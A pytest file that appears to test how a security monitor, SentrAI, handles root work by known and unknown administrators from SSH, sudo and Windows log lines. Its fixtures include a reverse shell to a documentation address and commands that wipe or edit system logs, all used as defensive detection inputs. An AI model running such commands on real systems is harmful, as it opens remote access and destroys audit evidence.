"""The administrators (admins.py): root work by a known administrator is recorded, root work from a sign-in
SentrAI does not recognise asks "was this you?", and "This was me" teaches it."""

import pytest
from fastapi.testclient import TestClient

from app.admins import TRUSTED, UNKNOWN, SUSPECT
from app.agents import Needle, Proposal
from app.config import Settings
from app.main import create_app

AUTH = {"Authorization": "Bearer test-token"}  # the token conftest sets

HOST = "web-01"
KEY = "SHA256:Q7w3cZk2u5Yd9bJm1LxkfA0Hn6Rr8PtEoSvNqGiCz4U"
KEY2 = "SHA256:Zz9x8c7v6b5n4m3L2k1j0h9g8f7d6s5a4p3o2i1u0y9T"
WIPE = "/usr/bin/systemctl stop sentrai-core"
ADMIN = "unauthorised_admin"


def make_client(tmp_path, **kw) -> TestClient:
    settings = Settings(db_path=tmp_path / "sentrai.db", background=False, demo_speed=60.0, **kw)
    app = create_app(settings)
    c = TestClient(app, headers=AUTH)
    c.__enter__()
    c.core = app.state.core  # type: ignore[attr-defined]
    return c


def line(n, raw, source="linux_auth", host=HOST, **extra):
    return {"event_id": f"evt-adm-{n}", "timestamp": "2026-10-28T10:00:00+08:00", "host": host, "layer": "os",
            "source": source, "raw": raw, **extra}


def accepted(n, user="erick", ip="203.0.113.5", key=KEY, method="publickey", pid=4100):
    tail = f" ssh2: ED25519 {key}" if key else " ssh2"
    return line(n, f"sshd[{pid}]: Accepted {method} for {user} from {ip} port 51234{tail}")


def failed(n, user="root", ip="203.0.113.10", pid=7000):
    return line(n, f"sshd[{pid}]: Failed password for {user} from {ip} port {40000 + n} ssh2")


def who(n, what, user="erick", tty="pts/0", ip="203.0.113.5"):
    origin = f" from {ip}" if ip else ""
    return line(n, f"session {what}: {user} on {tty}{origin} since 2026-10-28T10:00:00+08:00", source="sessions")


def sudo(n, cmd=WIPE, user="erick", tty="pts/0", target="root"):
    return line(n, f"sudo:  {user} : TTY={tty} ; PWD=/home/{user} ; USER={target} ; COMMAND={cmd}")


def post(c, *events):
    for e in events:
        r = c.post("/events", json=e)
        assert r.status_code == 200, r.text


def incidents(c, category=None):
    return [i for i in c.get("/incidents").json() if category is None or i["category"] == category]


def audit_types(c):
    return [r["type"] for r in c.core.audit.records()]


# ------------------------------------------------------------ unknown sign-in
def test_root_work_from_an_unknown_sign_in_asks_was_this_you(client):
    post(client, sudo(1))
    incs = incidents(client)
    assert [i["category"] for i in incs] == [ADMIN]
    inc = incs[0]
    assert inc["needs_review"] and inc["status"] == "open" and inc["actions"] == []
    assert inc["severity"] == "critical" and inc["user"] == "erick" and inc["host"] == HOST
    assert inc["actor"]["trust"] == UNKNOWN and "no sign-in seen" in inc["actor"]["why"]
    assert "Log tampering" in inc["classification_reason"]  # what the line itself says is kept
    assert "This was me" in inc["explanation"] and "Not me" in inc["explanation"]
    assert any("This was me" in s for s in inc["next_steps"])
    notes = [n for n in client.core.notifications if n["incident"] == inc["id"]]
    assert notes and notes[0]["kind"] == "was_this_you"
    assert [b["action"] for b in notes[0]["buttons"]] == ["mine", "approve", "ack"]
    assert incidents(client, "log_tampering") == []
    # More root work from the same unknown sign-in joins the same incident.
    post(client, sudo(2, "/usr/bin/rm -f /var/log/auth.log"))
    assert len(incidents(client)) == 1 and len(incidents(client)[0]["event_ids"]) == 2


def test_root_ssh_login_from_an_unknown_address_asks(client):
    post(client, accepted(1, user="root", ip="203.0.113.9", key=None, method="password"))
    incs = incidents(client, ADMIN)
    assert len(incs) == 1 and incs[0]["src_ip"] == "203.0.113.9" and incs[0]["user"] == "root"
    assert "block 203.0.113.9" in incs[0]["recommended_action"].lower()


def test_plain_root_work_from_an_unknown_sign_in_is_a_quieter_question(client):
    # Even `sudo apt update` is root work: SentrAI asks once per sign-in, with fewer points than a wiped log.
    post(client, accepted(1), who(2, "started"), sudo(3, "/usr/bin/apt update"), sudo(4, "/usr/bin/ls /root"))
    incs = incidents(client)
    assert len(incs) == 1 and incs[0]["category"] == ADMIN and incs[0]["points"] == 45.0  # 60 x 0.75
    assert sorted(incs[0]["event_ids"]) == ["evt-adm-3", "evt-adm-4"]
    data = client.get("/admins", params={"host": HOST}).json()
    assert [s["user"] for s in data["sessions"]] == ["erick"]
    assert data["sessions"][0]["trust"] == UNKNOWN and data["sessions"][0]["actions"] == 2
    assert data["activity"] == []  # only a known administrator's work is listed as admin activity
    post(client, sudo(5, "/usr/bin/rm -rf /var/log/nginx"))  # a flagged command raises the same incident to full points
    assert incidents(client)[0]["points"] == 60.0


def test_a_sign_in_alone_is_never_an_incident(client):
    post(client, accepted(1), who(2, "started"), line(3, "pam_unix(sshd:session): session opened for user erick(uid=1000) by (uid=0)"))
    assert incidents(client) == []


# ------------------------------------------------------------ known administrators
def test_known_address_records_root_work_instead_of_raising(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.5"})
    post(c, accepted(1), sudo(2))
    assert incidents(c) == []
    ev = c.core.events["evt-adm-2"]
    assert ev["category"] == "benign" and ev["admin_action"] and ev["flagged_as"] == "log_tampering"
    assert ev["actor"]["trust"] == TRUSTED and "ADMIN_IPS" in ev["actor"]["why"]
    rec = [r for r in c.core.audit.records() if r["type"] == "admin_action"]
    assert len(rec) == 1 and rec[0]["data"]["would_be"] == "log_tampering" and rec[0]["data"]["user"] == "erick"
    data = c.get("/admins").json()
    assert data["activity"][0]["flagged_as"] == "log_tampering" and WIPE in data["activity"][0]["what"]
    # The key seen with the known address is learned, and the account becomes a known administrator account.
    assert any(k["fingerprint"] == KEY and k["how"] == "learned" for k in data["keys"])
    assert any(a["account"] == "erick" and a["host"] == HOST for a in data["accounts"])
    # ... so the same key from a new address is trusted too, and that address is learned.
    post(c, accepted(3, ip="198.51.100.20", pid=4200), sudo(4, "/usr/bin/journalctl --vacuum-time=1s"))
    assert incidents(c) == []
    assert any(a["address"] == "198.51.100.20" and a["how"] == "learned" for a in c.get("/admins").json()["addresses"])


def test_known_key_setting_and_known_account_setting(tmp_path):
    c = make_client(tmp_path, admin_ssh_keys={KEY2}, admin_accounts={"ops@web-01"})
    post(c, accepted(1, user="erick", ip="198.51.100.9", key=KEY2), sudo(2))
    post(c, sudo(3, user="ops", tty="tty1"))  # no sign-in seen, but a known administrator account on this machine
    post(c, sudo(4, user="guest", tty="pts/9"))
    incs = incidents(c)
    assert [(i["category"], i["user"]) for i in incs] == [(ADMIN, "guest")]


def test_service_account_root_work_is_privilege_escalation_not_a_question(client):
    post(client, sudo(1, "/bin/sh -c id", user="www-data", tty="unknown"))
    assert [i["category"] for i in incidents(client)] == ["privilege_escalation"]


def test_findings_that_are_not_commands_stand_whoever_is_signed_in(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.5"})
    post(c, accepted(1), line(2, "process reverse shell: bash -i >& /dev/tcp/203.0.113.66/4444 0>&1 by erick",
                              source="threat_scan", user="erick", parsed={"kind": "threat", "finding": "reverse_shell"}))
    cats = [i["category"] for i in incidents(c)]
    assert cats and cats != [ADMIN] and "benign" not in cats


# ------------------------------------------------------------ this was me / not me
def test_this_was_me_teaches_closes_and_survives_a_restart(tmp_path):
    c = make_client(tmp_path)
    post(c, accepted(1), who(2, "started"), sudo(3))
    inc = incidents(c, ADMIN)[0]
    assert inc["src_ip"] == "203.0.113.5"  # the sign-in's address, so a block has a target
    assert inc["actor"]["session"] and inc["actor"]["key"] == KEY and inc["actor"]["via"] == "ssh"
    r = c.post(f"/incidents/{inc['id']}/mine", json={"operator": "erick@example.com", "channel": "telegram"})
    assert r.status_code == 200, r.text
    out = r.json()
    assert out["status"] == "resolved" and out["resolved_by"] == "erick@example.com"
    assert set(out["learned"]) == {"address 203.0.113.5", f"SSH key {KEY[:19]}…", f"account erick on {HOST}"}
    assert "admin_confirmed" in audit_types(c)
    data = c.get("/admins").json()
    assert any(a["address"] == "203.0.113.5" and a["how"] == "taught" for a in data["addresses"])
    assert data["sessions"][0]["trust"] == TRUSTED
    # The same session's next root command is recorded, not raised.
    post(c, sudo(4, "/usr/bin/rm -f /var/log/auth.log"))
    assert all(i["status"] == "resolved" for i in incidents(c))
    assert c.core.events["evt-adm-4"]["admin_action"]
    # The file outlives the core: after a restart, the account, address and key are still known.
    c.__exit__(None, None, None)
    c2 = make_client(tmp_path)
    assert c2.get("/admins").json()["addresses"][0]["address"] == "203.0.113.5"
    post(c2, sudo(10, user="erick", tty="pts/3"))  # no sign-in seen since the restart: the account is known
    assert incidents(c2) == [] or all(i["status"] == "resolved" for i in incidents(c2))
    post(c2, accepted(11, ip="198.51.100.77", key=KEY, pid=4300), sudo(12, tty="pts/4"))  # known key, new address
    assert all(i["status"] == "resolved" for i in incidents(c2))
    assert c2.core.events["evt-adm-12"]["actor"]["trust"] == TRUSTED
    # A sign-in from an address only closing the incident knew (no key) still gets asked.
    post(c2, accepted(13, user="erick", ip="198.51.100.78", key=None, method="password", pid=4400), sudo(14, tty="pts/5"))
    open_now = [i for i in incidents(c2, ADMIN) if i["status"] == "open"]
    assert open_now == [] or open_now[0]["src_ip"] == "198.51.100.78"
    c2.__exit__(None, None, None)


def test_this_was_me_closes_the_same_persons_other_incidents_and_undoes_blocks(tmp_path):
    c = make_client(tmp_path)
    post(c, accepted(1, ip="203.0.113.7", key=KEY2), sudo(2, "/usr/bin/sed -i /203.0.113.7/d /var/log/auth.log"))
    inc = incidents(c, ADMIN)[0]
    # The person first pressed "Not me" by mistake: the block went on ...
    r = c.post(f"/incidents/{inc['id']}/decision", json={"operator": "ishmail", "decision": "approve",
                                                        "justification": "not me"})
    assert r.status_code == 200 and r.json()["status"] == "contained"
    assert "203.0.113.7" in c.get("/blocklist").json()["ips"]
    # ... "This was me" is no longer possible on a closed incident, but it was only contained, not closed.
    r = c.post(f"/incidents/{inc['id']}/mine", json={"operator": "erick"})
    assert r.status_code == 200, r.text
    assert "203.0.113.7" not in c.get("/blocklist").json()["ips"]
    assert r.json()["status"] == "resolved"
    rolled = [x for x in c.core.audit.records() if x["type"] == "action_rolled_back"]
    assert rolled and "administrator's own" in rolled[-1]["data"]["reason"]


def test_not_me_blocks_the_address_and_forgets_what_was_learned(tmp_path):
    c = make_client(tmp_path, admin_ssh_keys={KEY2})
    # A known key from a new address: the address is learned ...
    post(c, accepted(1, ip="203.0.113.7", key=KEY2), sudo(2, "/usr/bin/apt update"))
    assert any(a["address"] == "203.0.113.7" and a["how"] == "learned" for a in c.get("/admins").json()["addresses"])
    # ... but the key was stolen: a later sign-in with a password from another address does root work.
    post(c, accepted(3, ip="203.0.113.8", key=None, method="password", pid=4500), sudo(4, tty="pts/1"))
    inc = incidents(c, ADMIN)[0]
    assert inc["src_ip"] == "203.0.113.8"
    r = c.post(f"/incidents/{inc['id']}/decision", json={"operator": "erick", "decision": "approve",
                                                        "justification": "I was not signed in"})
    assert r.status_code == 200, r.text
    assert r.json()["status"] == "contained"
    assert [a["type"] + " " + a["target"] for a in r.json()["actions"]] == ["block_ip 203.0.113.8", "lock_user erick"]
    assert "admin_distrusted" in audit_types(c)
    data = c.get("/admins").json()
    assert any(s["address"] == "203.0.113.8" for s in data["suspect"])
    assert any(x["trust"] == SUSPECT and x["address"] == "203.0.113.8" for x in data["sessions"])


def test_mine_is_refused_when_closed_or_switched_off(tmp_path):
    c = make_client(tmp_path)
    post(c, sudo(1))
    inc = incidents(c)[0]
    c.post(f"/incidents/{inc['id']}/resolve", json={"operator": "erick", "note": "handled"})
    assert c.post(f"/incidents/{inc['id']}/mine", json={"operator": "erick"}).status_code == 409
    assert c.post("/incidents/RSK-2026-999/mine", json={"operator": "erick"}).status_code == 404
    c.__exit__(None, None, None)
    off = make_client(tmp_path / "off", admin_sessions=False)
    post(off, sudo(1))
    assert [i["category"] for i in incidents(off)] == ["log_tampering"]  # the older behaviour
    assert off.post(f"/incidents/{incidents(off)[0]['id']}/mine", json={"operator": "erick"}).status_code == 400
    off.__exit__(None, None, None)


# ------------------------------------------------------------ sessions
def test_who_session_links_a_command_to_its_sign_in_by_terminal(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.5"})
    # Two people on the box: the administrator on pts/0 (known address), a stranger on pts/1.
    post(c, accepted(1, user="erick", ip="203.0.113.5"), who(2, "started", "erick", "pts/0", "203.0.113.5"),
         accepted(3, user="erick", ip="203.0.113.77", key=None, method="password", pid=4600),
         who(4, "started", "erick", "pts/1", "203.0.113.77"))
    post(c, sudo(5, tty="pts/0"), sudo(6, "/usr/bin/rm -rf /var/log/nginx", tty="pts/1"))
    incs = incidents(c, ADMIN)
    assert len(incs) == 1 and incs[0]["src_ip"] == "203.0.113.77"
    assert incs[0]["event_ids"] == ["evt-adm-6"]
    assert c.core.events["evt-adm-5"]["admin_action"]
    sessions = {s["tty"]: s for s in c.get("/admins").json()["sessions"]}
    assert sessions["pts/0"]["trust"] == TRUSTED and sessions["pts/1"]["trust"] == UNKNOWN
    # The stranger signs out: their session ends, the administrator's stays.
    post(c, who(7, "ended", "erick", "pts/1", "203.0.113.77"))
    assert [s["tty"] for s in c.get("/admins").json()["sessions"]] == ["pts/0"]


def test_console_sign_in_is_trusted_only_for_a_known_account(tmp_path):
    c = make_client(tmp_path, admin_accounts={"erick"})
    post(c, who(1, "existing", "erick", "tty1", None), sudo(2, tty="tty1"))
    post(c, who(3, "existing", "root", "tty2", None))  # root at the console, and SentrAI does not know root here
    incs = incidents(c, ADMIN)
    assert len(incs) == 1 and incs[0]["user"] == "root" and incs[0]["src_ip"] is None
    assert "no allowlisted" in incs[0]["recommended_action"].lower() or "lock" in incs[0]["recommended_action"].lower() \
        or incs[0]["recommended_action"] == ""
    assert c.core.events["evt-adm-2"]["actor"]["trust"] == TRUSTED


def test_su_in_a_trusted_session_opens_roots_session_on_that_terminal(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.5"})
    post(c, accepted(1), who(2, "started"), line(3, "su: (to root) erick on pts/0"),
         who(4, "started", "root", "pts/0", None),  # `who` cannot see where root came from
         sudo(5, user="root", tty="pts/0"))
    assert incidents(c) == []
    assert c.core.events["evt-adm-5"]["actor"]["trust"] == TRUSTED


def test_dashboard_sign_in_vouches_for_its_address_for_a_while(tmp_path):
    c = make_client(tmp_path, admin_signin_hours=2.0)
    assert c.post("/admins/sign-in", json={"email": "hozen@example.com", "role": "Auditor",
                                          "address": "203.0.113.8"}).json()["vouched"] is False
    r = c.post("/admins/sign-in", json={"email": "erick@example.com", "role": "Owner", "address": "203.0.113.8"})
    assert r.json()["vouched"] is True and "admin_signed_in" in audit_types(c)
    post(c, accepted(1, ip="203.0.113.8", key=None, method="password"), sudo(2))
    assert incidents(c) == []
    assert "dashboard sign-in by erick@example.com" in c.core.events["evt-adm-2"]["actor"]["why"]
    c.core.advance(3.0)  # the vouch (2 demo hours) has run out
    post(c, accepted(3, ip="203.0.113.8", key=None, method="password", pid=4700), sudo(4, tty="pts/2"))
    assert len(incidents(c, ADMIN)) == 1


def test_password_guessing_then_success_is_suspect_even_from_a_known_address(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.10"})
    post(c, *[failed(i, pid=7000 + i) for i in range(6)])
    assert [i["category"] for i in incidents(c)] == ["brute_force"]
    post(c, accepted(7, user="root", ip="203.0.113.10", key=None, method="password", pid=7100), sudo(8, user="root"))
    cats = sorted(i["category"] for i in incidents(c))
    assert cats == ["brute_force", ADMIN]
    adm = incidents(c, ADMIN)[0]
    assert adm["actor"]["trust"] == SUSPECT and "password guessing" in adm["actor"]["why"]


def test_sessions_expire_and_the_machine_list_counts_them(tmp_path):
    c = make_client(tmp_path, admin_session_hours=1.0)
    post(c, accepted(1), who(2, "started"))
    assert [m["sessions"] for m in c.get("/machines").json() if m["host"] == HOST] == [1]
    c.core.advance(2.0)
    assert c.get("/admins", params={"host": HOST}).json()["sessions"] == []
    assert [m["sessions"] for m in c.get("/machines").json() if m["host"] == HOST] == [0]


def test_log_shrinking_right_after_an_administrators_own_wipe_is_theirs(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.5"})
    post(c, accepted(1), sudo(2, "/usr/bin/truncate -s 0 /var/log/auth.log"),
         line(3, "log-integrity truncated: /var/log/auth.log shrank from 9000 to 0 bytes", source="log_integrity"))
    assert incidents(c) == []
    assert c.core.events["evt-adm-3"]["admin_action"]
    # Without an administrator's command before it, the same notice is an incident.
    post(c, line(4, "log-integrity deleted: /var/log/syslog vanished with no rotated copy", source="log_integrity",
                 host="db-01"))
    assert [i["category"] for i in incidents(c)] == ["log_tampering"]


# ------------------------------------------------------------ windows
def win(n, win_event, user, ip=None, host="win-srv01", **fields):
    kind = "auth" if win_event == "logon" else "windows_event"
    return {"event_id": f"evt-adm-w{n}", "timestamp": "2026-10-28T10:00:00+08:00", "host": host, "layer": "os",
            "source": "winevent:Security", "src_ip": ip, "user": user, "raw": f"Windows Security {win_event} user={user}",
            "parsed": {"format": "winevent", "kind": kind, "win_event": win_event, **fields}}


def test_windows_remote_desktop_session_and_admin_events(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.30"})
    rdp = dict(outcome="success", service="rdp", logon_type="remote_desktop", event_id=4624)
    post(c, win(1, "logon", "erick", "203.0.113.30", **rdp),
         win(2, "log_cleared", "erick", event_id=1102, log="Security"))
    assert incidents(c) == []
    assert c.core.events["evt-adm-w2"]["admin_action"] and c.core.events["evt-adm-w2"]["flagged_as"] == "log_tampering"
    post(c, win(3, "logon", "helpdesk", "203.0.113.31", **rdp),
         win(4, "group_member_added", "helpdesk", event_id=4732, group="Administrators", member="helpdesk"))
    incs = incidents(c, ADMIN)
    assert len(incs) == 1 and incs[0]["user"] == "helpdesk" and incs[0]["src_ip"] == "203.0.113.31"


# ------------------------------------------------------------ the admins endpoints and Countersign
def test_admins_endpoint_adds_and_forgets_by_hand(client):
    r = client.post("/admins", json={"operator": "erick", "action": "add", "kind": "address", "value": "203.0.113.12",
                                     "label": "home"})
    assert r.status_code == 200 and any(a["address"] == "203.0.113.12" and a["label"] == "home"
                                        for a in r.json()["addresses"])
    assert client.post("/admins", json={"operator": "erick", "action": "add", "kind": "address",
                                        "value": "not-an-address"}).status_code == 400
    assert client.post("/admins", json={"operator": "erick", "action": "add", "kind": "key",
                                        "value": "ssh-ed25519 AAAA"}).status_code == 400
    r = client.post("/admins", json={"operator": "erick", "action": "add", "kind": "key", "value": KEY})
    assert any(k["fingerprint"] == KEY and k["how"] == "taught" for k in r.json()["keys"])
    r = client.post("/admins", json={"operator": "erick", "action": "add", "kind": "account", "value": "erick",
                                     "host": HOST})
    assert any(a["account"] == "erick" and a["host"] == HOST for a in r.json()["accounts"])
    assert "admin_changed" in audit_types(client)
    # What was added by hand counts at once ...
    post(client, accepted(1, ip="203.0.113.12", key=None, method="password"), sudo(2))
    assert incidents(client) == []
    # ... and forgetting it takes it away again.
    r = client.post("/admins", json={"operator": "erick", "action": "forget", "kind": "address", "value": "203.0.113.12"})
    assert not any(a["address"] == "203.0.113.12" for a in r.json()["addresses"])
    assert client.post("/admins", json={"operator": "erick", "action": "drop", "kind": "address",
                                        "value": "203.0.113.12"}).status_code == 400


def test_countersign_never_blocks_a_known_administrator_address_on_its_own():
    n = Needle(0.5, {"block_ip"}, set(), admin_address=lambda ip: "ADMIN_IPS" if ip == "203.0.113.5" else None)
    ok, denied = n.screen([Proposal("block_ip", "203.0.113.5", "test"), Proposal("block_ip", "203.0.113.6", "test")],
                          autonomous=True)
    assert [p.target for p in ok] == ["203.0.113.6"]
    assert denied == [{"type": "block_ip", "target": "203.0.113.5", "why": "known administrator address: a person decides"}]
    ok, denied = n.screen([Proposal("block_ip", "203.0.113.5", "test")])  # an operator's own decision may
    assert [p.target for p in ok] == ["203.0.113.5"] and denied == []


def test_reset_forgets_sessions_but_not_what_was_taught(tmp_path):
    c = make_client(tmp_path)
    post(c, accepted(1), sudo(2))
    c.post(f"/incidents/{incidents(c)[0]['id']}/mine", json={"operator": "erick"})
    c.post("/demo/reset") if any(getattr(r, "path", None) == "/demo/reset" for r in c.app.routes) else c.core.reset()
    data = c.get("/admins").json()
    assert data["sessions"] == [] and any(a["address"] == "203.0.113.5" for a in data["addresses"])


# ------------------------------------------------------------ ways a guess could give too much trust
def test_a_logind_line_never_makes_a_remote_sign_in_look_like_the_console(tmp_path):
    c = make_client(tmp_path, admin_accounts={"erick"})
    # An intruder with erick's password: sshd's line, then logind's "New session" with no address.
    post(c, accepted(1, ip="203.0.113.66", key=None, method="password"),
         line(2, "systemd-logind[612]: New session 9 of user erick."), sudo(3, tty="pts/4"))
    incs = incidents(c, ADMIN)
    assert len(incs) == 1 and incs[0]["src_ip"] == "203.0.113.66"
    assert [s["via"] for s in c.get("/admins").json()["sessions"]] == ["ssh"]  # logind added no session
    post(c, line(4, "systemd-logind[612]: Removed session 9."))
    assert c.get("/admins").json()["sessions"] == []


def test_a_who_name_instead_of_an_address_is_remote_not_the_console(tmp_path):
    c = make_client(tmp_path, admin_accounts={"erick"})
    post(c, line(1, "session started: erick on pts/2 from attacker.example.net since 2026-10-28T10:00:00+08:00",
                 source="sessions"), sudo(2, tty="pts/2"))
    incs = incidents(c, ADMIN)
    assert len(incs) == 1 and "a name, not an address" in incs[0]["actor"]["why"]


def test_when_two_sign_ins_could_have_run_a_command_the_less_trusted_one_answers(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.5"})
    post(c, accepted(1, ip="203.0.113.5"), accepted(2, ip="203.0.113.67", key=None, method="password", pid=4800))
    post(c, sudo(3, tty="pts/7"))  # no `who` poll: nothing says which terminal is whose
    incs = incidents(c, ADMIN)
    assert len(incs) == 1 and incs[0]["src_ip"] == "203.0.113.67"
    assert "2 sign-ins were open" in incs[0]["actor"]["why"]


def test_alone_in_tmux_the_administrator_is_still_trusted(tmp_path):
    c = make_client(tmp_path, admin_ips={"203.0.113.5"})
    post(c, accepted(1), who(2, "started"), sudo(3, tty="pts/5"))  # a tmux pane: a terminal `who` does not list
    assert incidents(c) == []


def test_windows_itself_is_left_to_the_rules(tmp_path):
    c = make_client(tmp_path)
    post(c, win(1, "service_installed", "SYSTEM", event_id=7045, service="Windows Update Medic"),
         win(2, "service_installed", "WIN-SRV01$", event_id=7045, service="Some driver"))
    assert incidents(c, ADMIN) == []


def test_an_ssh_disconnect_ends_the_only_matching_sign_in(client):
    post(client, accepted(1), line(2, "sshd[4100]: Disconnected from user erick 203.0.113.5 port 51234"))
    assert client.get("/admins").json()["sessions"] == []


def test_what_is_learned_on_its_own_is_in_the_audit_trail(tmp_path):
    c = make_client(tmp_path, admin_ssh_keys={KEY})
    post(c, accepted(1, ip="198.51.100.30"))
    rec = [r["data"] for r in c.core.audit.records() if r["type"] == "admin_learned"]
    assert len(rec) == 1 and {k: rec[0][k] for k in ("kind", "value", "from", "host")} == {
        "kind": "address", "value": "198.51.100.30", "from": f"key {KEY[:19]}…", "host": HOST}
